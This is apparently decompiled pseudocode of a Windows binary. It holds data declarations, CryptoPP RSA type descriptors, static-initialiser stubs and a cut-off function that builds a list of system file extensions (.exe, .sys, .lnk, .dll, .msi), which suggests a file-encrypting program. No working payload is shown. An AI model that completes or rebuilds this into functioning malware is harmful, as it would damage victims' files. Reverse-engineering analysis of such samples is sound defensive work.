const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__ =
{
  0u,
  &sub_4063A0,
  NULL,
  &_CTA4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__
}; // idb
int (__thiscall **off_48C000)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C004[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall ***off_48C01C)(void *Block, char) = &off_48C000; // weak
int (__thiscall **off_48C020)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C024[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C03C)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C040[6] = { 0, 0, 0, 0, 0, 15 }; // weak
void **off_48C058 = &off_46C544; // weak
int (__stdcall *off_48C064)(_DWORD, _DWORD) = &sub_40E2D2; // weak
int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD) = &sub_40E335; // weak
int dword_48C06C = 8; // weak
int (__thiscall **off_48C070)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C074[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C08C)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C090[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C0A8)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C0AC[6] = { 0, 0, 0, 0, 0, 15 }; // weak
_DWORD dword_48C0C4[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C0DC)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C0E0[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C0F8)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C0FC[6] = { 0, 0, 0, 0, 0, 15 }; // weak
__int64 *off_48C114 = &qword_4914F0; // weak
int (__thiscall **off_48C118)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C11C[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C134)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C138[6] = { 0, 0, 0, 0, 0, 15 }; // weak
_DWORD dword_48C150[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C168)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C16C[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall ***off_48C184)(void *Block, char) = &off_48C168; // weak
int (__thiscall **off_48C188)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C18C[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C1A4)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C1A8[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C1C4)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C1C8[6] = { 0, 0, 0, 0, 0, 15 }; // weak
_DWORD dword_48C1E0[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int dword_48C1F8 = 32; // weak
int (__thiscall **off_48C1FC)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C200[6] = { 0, 0, 0, 0, 0, 15 }; // weak
_DWORD dword_48C218[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C234)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C238[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C250)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C254[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C270)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C274[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C28C)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C290[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C2A8)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C2AC[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C2C4)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C2C8[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int (__thiscall **off_48C2E0)(void *Block, char) = &off_46B440; // weak
_DWORD dword_48C2E4[6] = { 0, 0, 0, 0, 0, 15 }; // weak
int dword_48C2FC = -1; // weak
uintptr_t __security_cookie = 3141592654u;
int dword_48C334 = 1; // weak
DWORD dwSpinCount = 4000u; // idb
int dword_48C350 = -1; // weak
int dword_48C354 = 1; // weak
void *off_48C358 = &unk_471434; // weak
wchar_t *off_48C620 = L"         (((((                  H"; // weak
int dword_48C6F0 = -2; // weak
void *off_48CCA8 = &unk_48CA88; // idb
char aMarvel[7] = "Marvel"; // weak
void *dword_48CCC8 = NULL; // idb
int dword_48CCCC = 0; // weak
_DWORD dword_48CCD4[6] = { 0, 0, 0, 0, 0, 7 }; // weak
LPCWCH lpWideCharStr = NULL; // idb
int dword_48CD00 = 7; // weak
LPSTR lpMultiByteStr = NULL; // idb
int dword_48CD14 = 0; // weak
int dword_48CD18 = 15; // weak
_UNKNOWN unk_48CD1C; // weak
_UNKNOWN unk_48CD34; // weak
int (__thiscall **off_48CD4C)(void *Block, char) = &off_46B440; // weak
_UNKNOWN unk_48CD50; // weak
_UNKNOWN unk_48CD68; // weak
int (__thiscall **off_48CD80)(void *Block, char) = &off_46B440; // weak
const unsigned __int8 *unsigned char const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::Integer `RTTI Type Descriptor'; // weak
void **std::string `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct TypeDescriptor CryptoPP::AuthenticatedSymmetricCipher `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AVAuthenticatedSymmetricCipher@CryptoPP@@" }; // idb
bool bool `RTTI Type Descriptor' = true; // weak
_UNKNOWN CryptoPP::ByteArrayParameter `RTTI Type Descriptor'; // weak
_UNKNOWN enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme `RTTI Type Descriptor'; // weak
int dword_48D494 = 0; // weak
struct TypeDescriptor Concurrency::details::ExecutionResource `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AVExecutionResource@details@Concurrency@@" }; // idb
struct TypeDescriptor Concurrency::IExecutionResource `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AUIExecutionResource@Concurrency@@" }; // idb
void **std::string * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::RSAFunction `RTTI Type Descriptor'; // weak
int dword_48FCD8 = 0; // weak
_UNKNOWN CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor'; // weak
int dword_48FE18 = 0; // weak
struct TypeDescriptor CryptoPP::StreamTransformation `RTTI Type Descriptor' = { &type_info::`vftable', NULL, ".?AVStreamTransformation@CryptoPP@@" }; // idb
const int *int const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
int dword_49062C = 0; // weak
int int `RTTI Type Descriptor' = 4656312; // weak
int dword_490750 = 0; // weak
int dword_490C30 = 0; // weak
int dword_490C34 = 0; // weak
int dword_490C38 = 0; // weak
int dword_490C3C[] = { 0 }; // weak
int dword_490C40 = 0; // weak
int dword_490C44 = 0; // weak
int dword_490C4C = 0; // weak
int dword_490C5C = 0; // weak
int (__cdecl *dword_490C60)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_490C64 = 0; // weak
int dword_490C68 = 0; // weak
int dword_490C70 = 0; // weak
int dword_490C80 = 0; // weak
int dword_490C84[] = { 0 }; // weak
int dword_490C88 = 0; // weak
int dword_490C8C = 0; // weak
int dword_490C94 = 0; // weak
int dword_490CA4 = 0; // weak
int dword_490CA8[] = { 0 }; // weak
int dword_490CAC = 0; // weak
int dword_490CB0 = 0; // weak
int dword_490CB8 = 0; // weak
int dword_490CC8 = 0; // weak
int dword_490CD0 = 0; // weak
int dword_490CD4 = 0; // weak
int dword_490CD8 = 0; // weak
int dword_490CDC = 0; // weak
int dword_490CE0 = 0; // weak
int dword_490CE4 = 0; // weak
int dword_490CF0[] = { 0 }; // weak
int dword_490CF4[509] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  
}; // weak
int dword_4914E8; // weak
__int64 qword_4914F0; // weak
__int64 qword_4914F8; // weak
int dword_491500[]; // weak
int dword_491504[511]; // weak
char byte_491D00; // weak
char byte_491D01; // weak
char byte_491D08; // weak
char byte_491D09; // weak
char byte_491D0A; // weak
char byte_491D0B; // weak
char byte_491D0C; // weak
char byte_491D0D; // weak
char byte_491D0E; // weak
char byte_491D0F; // weak
char byte_491D10; // weak
char byte_491D11; // weak
char byte_491D12; // weak
char byte_491D13; // weak
char byte_491D14; // weak
char byte_491D15; // weak
char byte_491D16; // weak
char byte_491D17; // weak
char byte_491D18; // weak
int dword_491D1C; // weak
__int64 qword_491D20; // weak
int dword_491D28; // weak
_UNKNOWN unk_491D30; // weak
struct _RTL_CRITICAL_SECTION stru_491D38; // idb
struct _RTL_CRITICAL_SECTION stru_491D98; // idb
_UNKNOWN unk_491DF8; // weak
_UNKNOWN unk_491E08; // weak
_UNKNOWN unk_491E09; // weak
char byte_491E10[80]; // weak
int dword_491E60; // weak
_UNKNOWN unk_491EC4; // weak
_UNKNOWN unk_491ECC; // weak
_UNKNOWN unk_491ED0; // weak
_DWORD dword_491ED4; // weak
int dword_491EE0; // weak
_UNKNOWN unk_491EE8; // weak
int dword_491EF0; // weak
int dword_491F48[15]; // weak
int dword_491F84; // weak
_UNKNOWN unk_491FA8; // weak
_UNKNOWN unk_491FA9; // weak
char byte_491FB0[80]; // weak
int dword_492000[14]; // weak
int dword_492060; // weak
int dword_49209C; // weak
int dword_4922A4; // weak
int dword_4922BC; // weak
int dword_4922E0; // weak
int dword_4922E4; // weak
int dword_4922E8; // weak
int dword_4922EC; // weak
int dword_4922F0; // weak
int dword_4922F4; // weak
int dword_4922F8; // weak
int dword_4922FC; // weak
_UNKNOWN unk_492300; // weak
_UNKNOWN unk_492301; // weak
_UNKNOWN unk_492330; // weak
_UNKNOWN unk_4923BC; // weak
union _SLIST_HEADER stru_492448; // idb
int TlsIndex; // weak
int dword_49245C; // weak
_UNKNOWN unk_492460; // weak
int dword_492784; // weak
int dword_492788; // weak
int dword_492790; // weak
int dword_492794; // weak
int dword_492798; // weak
void *dword_49279C; // idb
int dword_4927A0; // weak
HMODULE hLibModule; // idb
int dword_4927A8; // weak
int dword_4927B8; // weak
ULONG_PTR ProcessAffinityMask; // idb
ULONG_PTR SystemAffinityMask; // idb
int dword_4927C4; // weak
void *dword_4927C8; // idb
int dword_4927CC; // weak
char byte_4927D0; // weak
int dword_4927D4; // weak
int dword_4927D8; // weak
int dword_4927DC; // weak
DWORD ReturnedLength; // idb
void *Block; // idb
int dword_4927E8; // weak
int dword_4927EC; // weak
DWORD dword_4927F0; // idb
int dword_4927F8; // weak
signed __int32 dword_4927FC[3]; // weak
int dword_492808; // weak
int dword_49280C; // weak
int dword_492810; // weak
int dword_492814; // weak
union _SLIST_HEADER ListHead; // idb
int dword_492820; // weak
int dword_492824; // weak
int dword_492828; // weak
int dword_49282C; // weak
int dword_492830; // weak
__int32 dword_492834; // weak
int dword_492838; // weak
int dword_492840; // weak
char byte_492844; // weak
int dword_492848; // weak
int dword_49284C; // weak
void *dword_492850; // idb
int dword_492858; // weak
int dword_49285C; // weak
DWORD dwTlsIndex; // idb
signed __int32 dword_492864[19]; // weak
int dword_4928DC; // weak
int dword_492908; // weak
int dword_492AC4; // weak
void *dword_492BE0; // idb
void *dword_492BE4; // idb
_onexit_table_t stru_492BE8; // idb
int dword_492C00; // weak
int dword_492C0C; // weak
int dword_492C10; // weak
int dword_492C14; // weak
LPCRITICAL_SECTION lpCriticalSection[128]; // weak
int dword_492E18; // weak
struct __crt_locale_data *dword_492F00; // idb
HANDLE hHeap; // idb
int dword_493020; // weak
_UNKNOWN unk_49302C; // weak
_UNKNOWN unk_493030; // weak
int dword_493034; // weak
_UNKNOWN unk_49303C; // weak
_UNKNOWN unk_493098; // weak
_UNKNOWN unk_4930A0; // weak
int dword_4930A4; // weak
_UNKNOWN unk_4930AC; // weak
char byte_493108; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_493124; // weak
void *Src; // idb
void *dword_493130; // idb
int dword_493134; // weak
_UNKNOWN unk_493138; // weak
_UNKNOWN unk_493168; // weak
_UNKNOWN unk_49316C; // weak
_UNKNOWN unk_493170; // weak
int dword_493178; // weak
int dword_49317C; // weak
int dword_493180; // weak
int dword_493184; // weak
int dword_493188; // weak
int dword_49318C; // weak
_UNKNOWN unk_493190; // weak
int dword_493194; // weak
int dword_493198; // weak
_UNKNOWN unk_49319C; // weak
struct _WIN32_FIND_DATAW FindFileData; // idb
_UNKNOWN unk_493420; // weak
_UNKNOWN unk_493424; // weak
int dword_49342C; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  return atexit(sub_469E32);
}

//----- (0040100C) --------------------------------------------------------
int sub_40100C()
{
  return atexit(sub_469E42);
}

//----- (00401018) --------------------------------------------------------
int sub_401018()
{
  return atexit(sub_469E4D);
}

//----- (00401024) --------------------------------------------------------
int sub_401024()
{
  unknown_libname_15("AAD");
  return atexit(sub_469E57);
}

//----- (00401059) --------------------------------------------------------
int sub_401059()
{
  return atexit(sub_469E6D);
}

//----- (00401065) --------------------------------------------------------
int sub_401065()
{
  return atexit(sub_469E9C);
}

//----- (00401071) --------------------------------------------------------
int sub_401071()
{
  return atexit(sub_469EA7);
}

//----- (0040107D) --------------------------------------------------------
int sub_40107D()
{
  unknown_libname_15("AAD");
  return atexit(sub_469EB1);
}

//----- (00401098) --------------------------------------------------------
int sub_401098()
{
  return atexit(sub_469EC7);
}

//----- (004010A4) --------------------------------------------------------
int sub_4010A4()
{
  return atexit(sub_469ED6);
}

//----- (004010B0) --------------------------------------------------------
int sub_4010B0()
{
  return atexit(sub_469EE1);
}

//----- (004010BC) --------------------------------------------------------
int sub_4010BC()
{
  return atexit(sub_469EF0);
}

//----- (004010C8) --------------------------------------------------------
int sub_4010C8()
{
  return atexit(sub_469EFB);
}

//----- (004010D4) --------------------------------------------------------
int sub_4010D4()
{
  return atexit(sub_469F0B);
}

//----- (004010E0) --------------------------------------------------------
int sub_4010E0()
{
  return atexit(sub_469F17);
}

//----- (004010F1) --------------------------------------------------------
int sub_4010F1()
{
  return atexit(sub_469F26);
}

//----- (004010FD) --------------------------------------------------------
int sub_4010FD()
{
  return atexit(sub_469F61);
}

//----- (00401109) --------------------------------------------------------
int sub_401109()
{
  return atexit(sub_469F70);
}

//----- (00401115) --------------------------------------------------------
int sub_401115()
{
  unsigned int v0; // eax
  int v1; // edx

  v0 = sub_40BC7D("AAD");
  sub_40BC05((void **)dword_48C0C4, v1, "AAD", v0);
  return atexit(sub_469F7B);
}
// 401129: variable 'v1' is possibly undefined
// 48C0C4: using guessed type _DWORD dword_48C0C4[6];

//----- (0040113B) --------------------------------------------------------
int sub_40113B()
{
  return atexit(sub_469F8A);
}

//----- (00401147) --------------------------------------------------------
int sub_401147()
{
  return atexit(sub_469F99);
}

//----- (00401153) --------------------------------------------------------
int sub_401153()
{
  return atexit(sub_469FA4);
}

//----- (0040115F) --------------------------------------------------------
int sub_40115F()
{
  return atexit(sub_469FB3);
}

//----- (0040116B) --------------------------------------------------------
int sub_40116B()
{
  return atexit(sub_469FC8);
}

//----- (00401177) --------------------------------------------------------
int sub_401177()
{
  return atexit(sub_469FD7);
}

//----- (00401183) --------------------------------------------------------
int sub_401183()
{
  return atexit(sub_469FE2);
}

//----- (0040118F) --------------------------------------------------------
int sub_40118F()
{
  return atexit(sub_469FF1);
}

//----- (0040119B) --------------------------------------------------------
int sub_40119B()
{
  unsigned int v0; // eax
  int v1; // edx

  v0 = sub_40BC7D("AAD");
  sub_40BC05((void **)dword_48C150, v1, "AAD", v0);
  return atexit(sub_469FFC);
}
// 4011AF: variable 'v1' is possibly undefined
// 48C150: using guessed type _DWORD dword_48C150[6];

//----- (004011C1) --------------------------------------------------------
int sub_4011C1()
{
  return atexit(sub_46A00B);
}

//----- (004011CD) --------------------------------------------------------
int sub_4011CD()
{
  return atexit(sub_46A01A);
}

//----- (004011D9) --------------------------------------------------------
int sub_4011D9()
{
  return atexit(sub_46A025);
}

//----- (004011E5) --------------------------------------------------------
int sub_4011E5()
{
  return atexit(sub_46A034);
}

//----- (004011F1) --------------------------------------------------------
int sub_4011F1()
{
  return atexit(sub_46A03F);
}

//----- (004011FD) --------------------------------------------------------
int sub_4011FD()
{
  return atexit(sub_46A04E);
}

//----- (00401209) --------------------------------------------------------
int sub_401209()
{
  return atexit(sub_46A059);
}

//----- (00401215) --------------------------------------------------------
int sub_401215()
{
  return atexit(sub_46A068);
}

//----- (00401221) --------------------------------------------------------
int sub_401221()
{
  unsigned int v0; // eax
  int v1; // edx

  v0 = sub_40BC7D("AAD");
  sub_40BC05((void **)dword_48C1E0, v1, "AAD", v0);
  return atexit(sub_46A073);
}
// 401235: variable 'v1' is possibly undefined
// 48C1E0: using guessed type _DWORD dword_48C1E0[6];

//----- (00401247) --------------------------------------------------------
int sub_401247()
{
  return atexit(sub_46A082);
}

//----- (00401253) --------------------------------------------------------
int sub_401253()
{
  return atexit(sub_46A091);
}

//----- (00401264) --------------------------------------------------------
int sub_401264()
{
  unsigned int v0; // eax
  int v1; // edx

  v0 = sub_40BC7D("AAD");
  sub_40BC05((void **)dword_48C218, v1, "AAD", v0);
  return atexit(sub_46A09C);
}
// 401278: variable 'v1' is possibly undefined
// 48C218: using guessed type _DWORD dword_48C218[6];

//----- (0040128A) --------------------------------------------------------
int sub_40128A()
{
  return atexit(sub_46A0AB);
}

//----- (00401296) --------------------------------------------------------
int sub_401296()
{
  return atexit(sub_46A0BA);
}

//----- (004012A2) --------------------------------------------------------
int sub_4012A2()
{
  return atexit(sub_46A0C5);
}

//----- (004012AE) --------------------------------------------------------
int sub_4012AE()
{
  return atexit(sub_46A0D4);
}

//----- (004012BA) --------------------------------------------------------
int sub_4012BA()
{
  return atexit(sub_46A0DF);
}

//----- (004012C6) --------------------------------------------------------
int sub_4012C6()
{
  return atexit(sub_46A0EE);
}

//----- (004012D2) --------------------------------------------------------
int sub_4012D2()
{
  return atexit(sub_46A0F9);
}

//----- (004012DE) --------------------------------------------------------
int sub_4012DE()
{
  return atexit(sub_46A108);
}

//----- (004012EA) --------------------------------------------------------
int sub_4012EA()
{
  return atexit(sub_46A113);
}

//----- (004012F6) --------------------------------------------------------
int sub_4012F6()
{
  return atexit(sub_46A122);
}

//----- (00401302) --------------------------------------------------------
int sub_401302()
{
  return atexit(sub_46A12D);
}

//----- (0040130E) --------------------------------------------------------
int sub_40130E()
{
  return atexit(sub_46A13C);
}

//----- (0040131A) --------------------------------------------------------
int sub_40131A()
{
  return atexit(sub_46A147);
}

//----- (00401326) --------------------------------------------------------
int sub_401326()
{
  return atexit(sub_46A156);
}

//----- (00401332) --------------------------------------------------------
int sub_401332()
{
  return atexit(sub_46A161);
}

//----- (0040133E) --------------------------------------------------------
int sub_40133E()
{
  return atexit(sub_46A170);
}

//----- (0040134A) --------------------------------------------------------
int sub_40134A()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_491D30);
  return atexit(sub_46A17B);
}

//----- (00401360) --------------------------------------------------------
int sub_401360()
{
  sub_4057DF(byte_491E10, (int)&dword_491E60, 0, 1);
  return atexit(sub_46A185);
}
// 491E60: using guessed type int dword_491E60;

//----- (004013B9) --------------------------------------------------------
void *sub_4013B9()
{
  void *v0; // edx

  v0 = &unk_491E10;
  dword_4922E4 = (int)&unk_491E10;
  if ( dword_4922E0 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922E0 + 4) + dword_4922E0 + 60) = &unk_491E10;
    v0 = (void *)dword_4922E4;
  }
  if ( dword_4922E8 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922E8 + 4) + dword_4922E8 + 60) = v0;
    v0 = (void *)dword_4922E4;
  }
  if ( dword_4922EC )
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922EC + 4) + dword_4922EC + 60) = v0;
  return &unk_491E09;
}
// 4922E0: using guessed type int dword_4922E0;
// 4922E4: using guessed type int dword_4922E4;
// 4922E8: using guessed type int dword_4922E8;
// 4922EC: using guessed type int dword_4922EC;

//----- (004013C3) --------------------------------------------------------
int sub_4013C3()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_491E08);
  return atexit(sub_46A199);
}

//----- (004013D9) --------------------------------------------------------
int sub_4013D9()
{
  return atexit(sub_46A1AD);
}

//----- (004013E5) --------------------------------------------------------
int sub_4013E5()
{
  return atexit(sub_46A1A3);
}

//----- (004013F1) --------------------------------------------------------
int sub_4013F1()
{
  sub_429EF2(dword_491F48, (int)&dword_491EF0, 0, 1);
  return atexit(sub_46A1B7);
}
// 491EF0: using guessed type int dword_491EF0;
// 491F48: using guessed type int dword_491F48[15];

//----- (0040144A) --------------------------------------------------------
int sub_40144A()
{
  int result; // eax

  dword_4922E0 = (int)&dword_491F48;
  result = dword_4922E4;
  *(int *)((char *)&dword_491F84 + *(_DWORD *)(dword_491F48 + 4)) = dword_4922E4;
  return result;
}
// 491F48: using guessed type int dword_491F48;
// 491F84: using guessed type int dword_491F84;
// 4922E0: using guessed type int dword_4922E0;
// 4922E4: using guessed type int dword_4922E4;

//----- (00401468) --------------------------------------------------------
int sub_401468()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_491EE8);
  return atexit(sub_46A1CB);
}

//----- (0040147E) --------------------------------------------------------
void *sub_40147E()
{
  void *v0; // edx

  v0 = &unk_491FB0;
  dword_4922F4 = (int)&unk_491FB0;
  if ( dword_4922F0 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922F0 + 4) + dword_4922F0 + 60) = &unk_491FB0;
    v0 = (void *)dword_4922F4;
  }
  if ( dword_4922F8 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922F8 + 4) + dword_4922F8 + 60) = v0;
    v0 = (void *)dword_4922F4;
  }
  if ( dword_4922FC )
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4922FC + 4) + dword_4922FC + 60) = v0;
  return &unk_491FA9;
}
// 4922F0: using guessed type int dword_4922F0;
// 4922F4: using guessed type int dword_4922F4;
// 4922F8: using guessed type int dword_4922F8;
// 4922FC: using guessed type int dword_4922FC;

//----- (00401488) --------------------------------------------------------
int sub_401488()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_491FA8);
  return atexit(sub_46A1D5);
}

//----- (0040149E) --------------------------------------------------------
int sub_40149E()
{
  sub_42A0E3(byte_491FB0, (int)&dword_492000, 0, 1);
  return atexit(sub_46A1DF);
}
// 492000: using guessed type int dword_492000;

//----- (00401523) --------------------------------------------------------
int sub_401523()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_492300);
  return atexit(sub_46A1FD);
}

//----- (00401539) --------------------------------------------------------
int sub_401539()
{
  return atexit(sub_46A1F3);
}

//----- (00401545) --------------------------------------------------------
int sub_401545()
{
  sub_42CB3D((int)&unk_4923BC);
  return atexit(sub_46A207);
}

//----- (0040155B) --------------------------------------------------------
int sub_40155B()
{
  return atexit(sub_46A211);
}

//----- (00401567) --------------------------------------------------------
FILE *sub_401567()
{
  FILE *result; // eax

  result = __acrt_iob_func(2u);
  dword_4927A8 = (int)result;
  return result;
}
// 4927A8: using guessed type int dword_4927A8;

//----- (00401575) --------------------------------------------------------
uintptr_t sub_401575()
{
  uintptr_t result; // eax

  result = sub_4302AA();
  dword_49280C = result;
  return result;
}
// 49280C: using guessed type int dword_49280C;

//----- (00401580) --------------------------------------------------------
void sub_401580()
{
  InitializeSListHead(&ListHead);
}

//----- (00401590) --------------------------------------------------------
int __thiscall sub_401590(LPCRITICAL_SECTION lpCriticalSection)
{
  unsigned int v1; // esi
  signed int LastError; // eax

  v1 = 0;
  if ( !InitializeCriticalSectionAndSpinCount(lpCriticalSection, 0) )
  {
    LastError = GetLastError();
    v1 = (unsigned __int16)LastError | 0x80070000;
    if ( LastError <= 0 )
      return LastError;
  }
  return v1;
}

//----- (00401654) --------------------------------------------------------
const char *__thiscall sub_401654(_DWORD *this)
{
  const char *result; // eax

  result = "Unknown exception";
  if ( this[1] )
    return (const char *)this[1];
  return result;
}

//----- (0040168F) --------------------------------------------------------
_DWORD *__thiscall sub_40168F(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 46EB14: using guessed type void *std::bad_array_new_length::`vftable';

//----- (004016A7) --------------------------------------------------------
void __noreturn sub_4016A7()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_40168F(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 4016A7: using guessed type void __noreturn sub_4016A7();
// 4016A7: using guessed type _DWORD pExceptionObject[3];

//----- (004016C4) --------------------------------------------------------
std::exception *__thiscall sub_4016C4(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 46EB14: using guessed type void *std::bad_array_new_length::`vftable';

//----- (004016DF) --------------------------------------------------------
std::exception *__thiscall sub_4016DF(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 46DB74: using guessed type void *std::bad_alloc::`vftable';

//----- (0040171E) --------------------------------------------------------
unsigned int *__stdcall sub_40171E(unsigned int *a1)
{
  void *Src[6]; // [esp+Ch] [ebp-88h] BYREF
  void *v3[6]; // [esp+24h] [ebp-70h] BYREF
  void *v4[6]; // [esp+3Ch] [ebp-58h] BYREF
  void *v5[6]; // [esp+54h] [ebp-40h] BYREF
  void *v6[6]; // [esp+6Ch] [ebp-28h] BYREF
  int v7; // [esp+84h] [ebp-10h] BYREF
  int v8; // [esp+90h] [ebp-4h]

  v7 = 0;
  Src[4] = 0;
  Src[5] = (void *)7;
  LOWORD(Src[0]) = 0;
  sub_401DB6(Src, L".exe");
  v8 = 1;
  v3[4] = 0;
  v3[5] = (void *)7;
  LOWORD(v3[0]) = 0;
  sub_401DB6(v3, L".sys");
  LOBYTE(v8) = 2;
  v4[4] = 0;
  v4[5] = (void *)7;
  LOWORD(v4[0]) = 0;
  sub_401DB6(v4, L".lnk");
  LOBYTE(v8) = 3;
  v5[4] = 0;
  v5[5] = (void *)7;
  LOWORD(v5[0]) = 0;
  sub_401DB6(v5, L".dll");
  LOBYTE(v8) = 4;
  v6[4] = 0;
  v6[5] = (void *)7;
  LOWORD(v6[0]) = 0;
  sub_401DB6(v6, L".msi");
  v8 = 5;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  sub_4021D5(a1, (char *)Src, (char *)&v7, (int)a1);
  v7 = 1;
  LOBYTE(v8) = 0;
  `eh vector destructor iterator'(Src, 0x18u, 5u, j_unknown_libname_3);
  return a1;
}
// 47E4FC: using guessed type wchar_t aExe[5];
// 47E508: using guessed type wchar_t aSys[5];
// 47E514: using guessed type wchar_t aLnk[5];
// 47E520: using guessed type wchar_t aDll[5];
// 47E52C: using guessed type wchar_t aMsi[5];

//----- (00401841) --------------------------------------------------------
int sub_401841()
{
  unsigned int v0; // edi
  int v1; // ecx
  unsigned int v2; // ebx
  LPWSTR *v3; // eax
  unsigned int v4; // esi
  unsigned __int8 v5; // al
  int v6; // ebx
  int v7; // esi
  LPWSTR *v8; // eax
  LPWSTR *v9; // eax
  LPWSTR *v10; // eax
  WCHAR *v11; // ecx
  LPWSTR *v12; // eax
  LPWSTR *v13; // eax
  void **v14; // eax
  const WCHAR *v15; // ecx
  void *v17[6]; // [esp+8h] [ebp-88h] BYREF
  WCHAR Buffer[8]; // [esp+20h] [ebp-70h] BYREF
  int v19; // [esp+30h] [ebp-60h]
  int v20; // [esp+34h] [ebp-5Ch]
  wchar_t S1[8]; // [esp+38h] [ebp-58h] BYREF
  int v22; // [esp+48h] [ebp-48h]
  int v23; // [esp+4Ch] [ebp-44h]
  LPWSTR lpCommandLine[4]; // [esp+50h] [ebp-40h] BYREF
  int v25; // [esp+60h] [ebp-30h]
  unsigned int v26; // [esp+64h] [ebp-2Ch]
  int v27; // [esp+68h] [ebp-28h] BYREF
  int v28; // [esp+6Ch] [ebp-24h]
  int v29; // [esp+70h] [ebp-20h]
  int v30[2]; // [esp+74h] [ebp-1Ch] BYREF
  int v31; // [esp+7Ch] [ebp-14h]
  unsigned int v32; // [esp+80h] [ebp-10h]
  int v33; // [esp+8Ch] [ebp-4h]

  v30[0] = 0;
  v33 = 1;
  v30[1] = (int)FindResourceW(0, (LPCWSTR)0x66, (LPCWSTR)0xA);
  v27 = 0;
  v28 = 0;
